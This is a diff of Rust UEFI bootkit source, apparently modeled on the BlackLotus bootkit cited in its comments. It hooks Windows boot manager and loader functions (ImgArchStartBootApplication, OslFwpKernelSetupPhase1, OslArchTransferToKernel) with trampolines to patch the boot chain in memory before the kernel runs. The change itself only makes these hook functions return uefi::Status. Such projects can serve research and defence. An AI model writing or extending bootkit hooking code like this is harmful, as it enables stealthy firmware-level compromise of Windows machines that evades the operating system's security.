@@ -13,7 +13,7 @@ use super::{includes::_LOADER_PARAMETER_BLOCK};
 extern crate alloc;
 
 #[allow(non_camel_case_types)]
-type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u8, image_size: u32, boot_option: u8, return_arguments: *mut u8);
+type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u8, image_size: u32, boot_option: u8, return_arguments: *mut u8) -> uefi::Status;
 
 #[allow(non_upper_case_globals)]
 static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;
@@ -29,13 +29,13 @@ const BL_MEMORY_ATTRIBUTE_RWX: u32 = 0x424000;
 const BL_MEMORY_TYPE_APPLICATION: u32 = 0xE0000012;
 
 #[allow(non_camel_case_types)]
-type OslArchTransferToKernelType = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8);
+type OslArchTransferToKernelType = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8) -> uefi::Status;
 
 #[allow(non_upper_case_globals)]
 static mut OslArchTransferToKernel: Option<OslArchTransferToKernelType> = None;
 
 #[allow(non_camel_case_types)]
-type OslFwpKernelSetupPhase1Type = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK);
+type OslFwpKernelSetupPhase1Type = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> uefi::Status;
 
 #[allow(non_upper_case_globals)]
 static mut OslFwpKernelSetupPhase1: Option<OslFwpKernelSetupPhase1Type> = None;
@@ -79,7 +79,7 @@ pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) -> ue
 /// ImgArchStartBootApplication in bootmgfw.efi: hooked to catch the moment when the Windows OS loader (winload.efi) 
 /// is loaded in the memory but still hasn't been executed to perform more in-memory patching.
 /// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
-pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mut u8, image_size: u32, _boot_option: u8, _return_arguments: *mut u8) {
+pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mut u8, image_size: u32, _boot_option: u8, _return_arguments: *mut u8) -> uefi::Status {
     
     // Unhook ImgArchStartBootApplication and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(), JMP_SIZE) };
@@ -129,7 +129,7 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
     log::info!("[+] Calling Original ImgArchStartBootApplication");
 
     // Call the original unhooked ImgArchStartBootApplication function
-    unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
+    return unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
 }
 
 // Thanks jonaslyk for providing the correct function signature for BlImgAllocateImageBuffer :)
@@ -162,7 +162,7 @@ fn bl_img_allocate_image_buffer_hook(image_buffer: *mut *mut c_void, image_size:
 }
 
 /// This is called by the Windows OS loader (winload.efi) with _LOADER_PARAMETER_BLOCK before calling ExitBootService (winload.efi context)
-fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) {
+fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> uefi::Status {
     // Unhook OslFwpKernelSetupPhase1 and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES.as_mut_ptr(),JMP_SIZE) };
 
@@ -220,8 +220,7 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
     */
 
     // Call the original unhooked OslFwpKernelSetupPhase1 function
-    unsafe { OslFwpKernelSetupPhase1.unwrap()(loader_block) };
-    
+    return unsafe { OslFwpKernelSetupPhase1.unwrap()(loader_block) };
 }
 
 
@@ -230,7 +229,7 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
 /// OslArchTransferToKernel in winload.efi: Hooked to catch the moment when the OS kernel and some of the system drivers are 
 /// already loaded in the memory, but still haven’t been executed to perform more in-memory patching
 /// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
-fn osl_arch_transfer_to_kernel_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8) {
+fn osl_arch_transfer_to_kernel_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK, entry: *mut u8) -> uefi::Status {
     
     // Unhook OslArchTransferToKernel and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(
@@ -241,5 +240,5 @@ fn osl_arch_transfer_to_kernel_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK, 
     };
 
     // Call the original unhooked OslArchTransferToKernel function
-    unsafe { OslArchTransferToKernel.unwrap()(loader_block, entry) };
+    return unsafe { OslArchTransferToKernel.unwrap()(loader_block, entry) };
 }
